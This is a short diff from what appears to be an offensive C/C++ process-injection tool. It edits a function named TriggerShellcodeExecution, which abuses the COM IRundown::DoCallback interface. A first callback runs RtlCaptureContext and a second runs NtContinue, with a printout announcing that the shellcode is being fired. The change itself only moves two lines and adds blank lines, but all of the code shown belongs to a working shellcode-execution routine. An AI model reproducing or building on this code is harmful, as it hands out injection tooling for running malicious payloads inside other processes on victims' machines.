@@ -212,12 +212,14 @@ TriggerShellcodeExecution(
 
         params.guidProcessSecret = rundownParams.secretGUID;
         params.pServerCtx = (PTRMEM)rundownParams.pContext;
-        params.pfnCallback = pfnRtlCaptureContex;
-        params.pParam = (PTRMEM)pRemoteSectionMapping.sampleContext;
 
         // First DoCallback cycle - RtlCaptureContext
         // RtlCaptureContext(pRemoteSectionMapping.sampleContext)
+        params.pfnCallback = pfnRtlCaptureContex;
+        params.pParam = (PTRMEM)pRemoteSectionMapping.sampleContext;
+        
         printf("[+] DoCallback 1.\n");
+        
         HRESULT hr = rndn->DoCallback(&params);
         if (FAILED(hr)) {
             printf("[-] DoCallback error: (0x%x)\n", hr);
@@ -259,6 +261,7 @@ TriggerShellcodeExecution(
         params.pfnCallback = pfnNtContinue;
 
         printf("[+] DoCallback 2. Firing shellcode & waiting...\n");
+        
         hr = rndn->DoCallback(&params);
         rndn->Release();
 
